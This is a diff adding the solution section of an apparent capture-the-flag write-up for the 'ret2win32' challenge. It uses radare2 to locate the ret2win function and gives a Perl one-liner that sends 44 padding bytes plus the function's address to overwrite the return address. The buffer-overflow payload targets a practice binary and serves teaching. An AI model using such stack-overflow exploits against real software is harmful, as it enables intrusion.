@@ -47,3 +47,32 @@ rabin2 -qs ret2win32 | grep -ve 'imp' -e ' 0 ' -e '_'
 
 The function `ret2win` looks very suspicious and matches the challenge name, so it's likely the function we're looking for. To be absolutely sure, let's take a closer look at the function itself.
 
+```
+r2 ret2win32
+```
+```
+aa
+```
+```
+afl
+```
+![](./6.png)
+```
+pdf @ sym.ret2win
+```
+![](./7.png)
+
+Indeed, that is the function we want.
+
+## Solution
+
+The `ret2win` function is located at address `0x0804862c`. To overwrite the return address, we first need to fill the stack with 44 garbage characters. The address will follow immediately after them.
+
+So, let's return to the terminal and enter the following command:
+
+```
+perl -e 'print "A"x44 . "\x2c\x86\x04\x08"' | ./ret2win32
+```
+![](./8.png)
+
+And that’s it!
